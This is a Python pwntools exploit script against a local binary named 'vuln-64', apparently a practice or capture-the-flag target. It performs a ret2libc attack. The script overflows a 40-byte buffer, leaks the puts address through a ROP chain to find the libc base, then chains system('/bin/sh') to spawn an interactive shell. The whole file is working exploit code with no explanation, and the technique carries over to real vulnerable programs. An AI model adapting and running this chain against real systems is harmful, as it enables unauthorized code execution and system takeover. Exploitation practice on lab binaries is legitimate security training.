#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-64')
libc = elf.libc
p = process()

POP_RDI = 0x4011cb

offset = 40

log.info(p.clean())

# payload = flat(
#     b'A' * offset,
#     POP_RDI,
#     elf.got['puts'],
#     elf.plt['puts'],
#     elf.sym['main']
# )

# p.sendline(payload)

rop = ROP(elf)

rop.raw(b'A' * offset)
rop.puts(elf.got['puts'])
rop.raw(elf.sym['main'])

p.sendline(rop.chain())

puts_leak = u64(p.recv(6) + b'\x00\x00')
libc.address = puts_leak - libc.sym['puts']
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))

log.info(p.clean())

# payload = flat(
#     b'A' * offset,
#     POP_RDI + 1,
#     POP_RDI,
#     binsh,
#     system,
#     libc.sym['exit'] 
# )

# p.sendline(payload)

rop = ROP(libc)

rop.raw(b'A' * offset)
rop.raw(POP_RDI + 1)
rop.system(binsh)
rop.exit()

p.sendline(rop.chain())

p.interactive()
